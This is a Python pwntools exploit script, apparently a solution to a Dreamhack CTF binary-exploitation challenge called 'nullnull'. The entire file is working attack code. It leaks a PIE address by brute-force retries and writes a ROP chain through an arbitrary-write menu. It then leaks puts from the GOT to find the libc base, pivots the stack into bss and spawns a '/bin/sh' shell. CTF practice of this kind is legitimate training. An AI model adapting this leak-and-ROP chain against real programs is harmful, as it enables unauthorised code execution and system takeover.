from pwn import *

#context.log_level = 'debug'

def command_aar(offset):
    p.sendline(b'3')
    p.sendline(str(offset).encode())


def command_aaw(offset,content):
    p.sendline(b'2')
    p.sendline(str(offset).encode())
    p.sendline(str(content).encode())

def command_scanf(content):
    p.sendline(b'1')
    p.send(content)
    

while(True):
    p = process('./nullnull')
    # p = remote('host1.dreamhack.games',21841)

    command_scanf(b'a'*75+b'12345')

    p.recvuntil(b'12345\n')
        
    command_aar(3)

    try:
        lic = int(p.recvn(14))
        print(hex(lic))
        break
    except:
        p.close()
        

pie_base = lic - 0x0000000000001249

raw_input()

ROP_chain = []
ROP_chain.append(pie_base + 0x000000000004020 + 0x110) # bss
ROP_chain.append(pie_base + 0x00000000000014e3) # pop rdi
ROP_chain.append(pie_base + 0x000000000003FA8) # puts got
ROP_chain.append(pie_base + 0x00000000000010C0) # puts plt
ROP_chain.append(pie_base + 0x00000000000014e3) # pop rdi
ROP_chain.append(pie_base + 0x0000000000002009) # %80s
ROP_chain.append(pie_base + 0x00000000000014e1) # pop rsi r15
ROP_chain.append(pie_base + 0x000000000004020 +0x110) # bss
ROP_chain.append(0x1) # dummy
ROP_chain.append(pie_base + 0x00000000000013BC) # ret
ROP_chain.append(pie_base + 0x000000000001110) # scanf
ROP_chain.append(pie_base + 0x00000000000013FD) # leave ret

print(len(ROP_chain))

for i in range(0,len(ROP_chain)):
    command_aaw(i+2,ROP_chain[i])

p.sendline(b'0')

puts_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
libc_base = puts_addr-0x84450
print(hex(puts_addr))

payload = b''
payload += b'/bin/sh\x00'
payload += p64(pie_base + 0x00000000000014e3)
payload += p64(pie_base + 0x000000000004020 + 0x110 )
payload += p64(pie_base + 0x00000000000014e1)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(libc_base + 0x00000000000e31a4)

p.sendline(payload)


p.interactive()